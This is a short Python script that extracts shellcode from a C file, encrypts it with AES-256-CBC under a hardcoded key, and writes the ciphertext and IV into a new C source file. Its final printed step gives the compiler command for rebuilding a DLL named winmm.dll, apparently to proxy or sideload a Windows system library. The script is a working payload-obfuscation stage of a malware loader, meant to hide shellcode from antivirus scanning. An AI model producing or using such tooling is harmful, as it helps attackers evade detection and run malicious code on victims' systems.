#!/usr/bin/env python3

import re
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

# 1. Extract shellcode from payload_hex.c
print("[+] Reading payload_hex.c...")
with open("payload_hex.c", 'r') as f:
    content = f.read()

# Find escape sequence: unsigned char buf[] = "\x...";
# Pattern matches: \xHH\xHH\xHH...
pattern = r'unsigned char \w+\[\]\s*=\s*"((?:\\x[0-9a-fA-F]{2})+)"'
matches = re.findall(pattern, content)

if not matches:
    print("[!] No shellcode found in payload_hex.c")
    print("[!] Expected format: unsigned char buf[] = \"\\x...\\x...\";")
    exit(1)

# Convert escape sequences to bytes
escape_seq = matches[0]
hex_bytes = bytes.fromhex(escape_seq.replace('\\x', ''))

print(f"[+] Extracted {len(hex_bytes)} bytes from payload_hex.c")

# 2. Encrypt with AES-256-CBC
key_string = "daylakeycuadoannt205hehehehehehehehe"
key = key_string.encode('utf-8')[:32]
iv = get_random_bytes(16)

print(f"[+] Key (hex): {key.hex()}")
print(f"[+] IV (hex): {iv.hex()}")

# Pad plaintext
plaintext_padded = pad(hex_bytes, AES.block_size)

# Encrypt
cipher = AES.new(key, AES.MODE_CBC, iv)
ciphertext = cipher.encrypt(plaintext_padded)

print(f"[+] Plaintext size: {len(hex_bytes)} bytes")
print(f"[+] Padded size: {len(plaintext_padded)} bytes")
print(f"[+] Ciphertext size: {len(ciphertext)} bytes")

# 3. Create new payload_hex.c with encrypted data
c_code = f'''// AES-256-CBC Encrypted Payload
const unsigned char IV[16] = {{ {", ".join(["0x" + iv.hex()[i:i+2] for i in range(0, len(iv.hex()), 2)])} }};

const unsigned char CIPHERTEXT[{len(ciphertext)}] = {{
    {", ".join(["0x" + ciphertext.hex()[i:i+2] for i in range(0, len(ciphertext.hex()), 2)])}
}};
'''

with open("payload_hex_encrypted.c", 'w') as f:
    f.write(c_code)

print(f"[+] New payload_hex_encrypted.c created!")
print(f"[+] Size: {len(c_code)} bytes")
print(f"\n[✓] Done! Now build DLL again with:")
print(f"    cl.exe /LD /MD /D_WINDOWS /D_USRDLL /DWINMM_EXPORTS winmm_pragma.c /link kernel32.lib user32.lib crypt32.lib /OUT:winmm.dll")
